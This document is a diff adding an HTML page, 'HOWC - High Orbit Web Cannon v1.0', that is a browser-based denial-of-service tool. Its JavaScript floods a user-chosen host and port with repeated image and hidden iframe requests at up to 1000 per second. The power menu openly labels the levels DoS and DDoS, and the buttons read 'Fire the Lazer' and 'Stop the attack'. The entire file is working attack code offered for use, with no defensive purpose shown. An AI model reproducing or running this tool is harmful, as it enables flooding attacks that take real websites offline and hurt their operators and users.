@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+
+  <html>
+
+    <head>
+
+      <script>
+
+        function HOWC(target, port, power)
+        {
+
+          var requests = 0;
+
+          var succeeded = 0;
+
+          var failed = 0;
+
+          var isFiring = false;
+
+          if(target.length == 0)
+          {
+
+            document.getElementById("errors").innerHTML = "You must specify a target.";
+
+          }
+          else
+          {
+
+            document.getElementById("errors").innerHTML = "";
+
+            document.getElementById("p").innerHTML = power;
+
+            if(port.length == 0 || port == 0)
+            {
+
+              port = 80;
+
+            }
+
+            var onRequest = function()
+            {
+
+              requests++;
+
+              document.getElementById("requests").innerHTML = requests;
+
+            };
+
+            var onSuccess = function()
+            {
+
+              succeeded++;
+
+              document.getElementById("succeeded").innerHTML = succeeded;
+
+            };
+
+            var onFail = function()
+            {
+
+              failed++;
+
+              document.getElementById("failed").innerHTML = failed;
+
+            };
+
+            var Low = function()
+            {
+
+              var image = new Image();
+
+              image.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+
+              onRequest();
+
+              onSuccess();
+
+            };
+
+            var Medium = function()
+            {
+
+              var image = new Image();
+
+              image.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+
+              onRequest();
+
+              onSuccess();
+
+            };
+
+            var High = function()
+            {
+
+              var image = new Image();
+
+              var iframe = document.createElement("iframe");
+
+              image.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+
+              iframe.setAttribute("src", "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000));
+
+              iframe.setAttribute("style", "visibility: hidden");
+
+              iframe.setAttribute("onload", "javascript:onRequest(); onSuccess();");
+
+              document.body.appendChild(iframe);
+
+              onRequest();
+
+              onSuccess();
+
+            };
+
+            var SuperHigh = function()
+            {
+
+              var image = new Image();
+
+              var iframe = document.createElement("iframe");
+
+              image.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+
+              iframe.setAttribute("src", "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000));
+
+              iframe.setAttribute("style", "visibility: hidden");
+
+              iframe.setAttribute("onload", "javascript:onRequest(); onSuccess();");
+
+              document.body.appendChild(iframe);
+
+              onRequest();
+
+              onSuccess();
+
+            }
+
+            document.getElementById("button").onclick = function()
+            {
+
+              if(isFiring)
+              {
+
+                document.getElementById("status").innerHTML = "Not Running";
+
+                document.getElementById("button").innerHTML = "F1r3 73H L4Z3r";
+
+                isFiring = false;
+
+                clearInterval(fireInterval);
+
+              }
+              else
+              {
+
+                document.getElementById("target").value = "";
+
+                document.getElementById("port").value = "";
+
+                document.getElementById("status").innerHTML = "Running";
+
+                document.getElementById("button").innerHTML = "S70P 7H3 4774cK";
+
+                switch(power)
+                {
+
+                  case "Low":
+
+                    fireInterval = setInterval(Low, (1000 / 50 | 0));
+
+                  break;
+
+                  case "Medium":
+
+                    fireInterval = setInterval(Medium, (1000 / 100 | 0));
+
+                  break;
+
+                  case "High":
+
+                    fireInterval = setInterval(High, (1000 / 500));
+
+                  break;
+
+                  case "Super High":
+
+                    fireInterval = setInterval(SuperHigh, (1000 / 1000));
+
+                  break;
+
+                }
+
+                isFiring = true;
+
+              }
+
+            };
+
+          }
+
+        }
+
+      </script>
+
+      <style>
+
+        body
+        {
+
+          background-color: black;
+
+          color: lime;
+
+          font-family: Impact, fantasy;
+
+        }
+
+        input, button
+        {
+
+          width: 300px;
+
+          border-radius: 3px;
+
+          background-color: lime;
+
+        }
+
+        select
+        {
+
+          width: 300px;
+
+        }
+
+      </style>
+
+      <title>
+
+        HOWC - High Orbit Web Cannon v1.0
+
+      </title>
+
+    </head>
+
+    <body>
+
+      <center>
+
+        <h1>
+
+          HOWC - High Orbit Web Cannon v1.0
+
+        </h1>
+
+      </center>
+
+      <center>
+
+        <input type="url" name="target" id="target" placeholder="TARGET E.G: google.com" />
+
+        <br />
+
+        <input type="number" name="port" id="port" placeholder="PORT" />
+
+        <h2>Power:</h2>
+
+        <select name="power" id="power">
+
+          <option value="Low">Low ( a DoS, 50 requests per second )</option>
+
+          <option value="Medium">Medium ( a DoS, 100 requests per second )</option>
+
+          <option value="High">High ( a DDoS, 500 requests per second )</option>
+
+          <option value="Super High">Super High ( a DDoS, 1000 requests per second )</option>
+
+        </select>
+
+        <br />
+
+        <button name="button" id="button" onclick="javascript:HOWC(document.getElementById('target').value, document.getElementById('port').value, document.getElementById('power').value);">F1r3 73H L4Z3r</button>
+
+        <br />
+
+        <div name="errors" id="errors">
+
+        </div>
+
+        <br />
+
+        Requests:
+
+        <br />
+
+        <div name="requests" id="requests">
+
+          0
+
+        </div>
+
+        <br />
+
+        Succeeded Requests:
+
+        <br />
+
+        <div name="succeeded" id="succeeded">
+
+          0
+
+        </div>
+
+        <br />
+
+        Failed Requests:
+
+        <br />
+
+        <div name="failed" id="failed">
+
+          0
+
+        </div>
+
+        <br />
+
+        Power:
+
+        <br />
+
+        <div name="p" id="p">
+
+        </div>
+
+        <br />
+
+        Status:
+
+        <br />
+
+        <div name="status" id="status">
+
+          Not Running
+
+        </div>
+
+      </center>
+
+    </body>
+
+  </html>
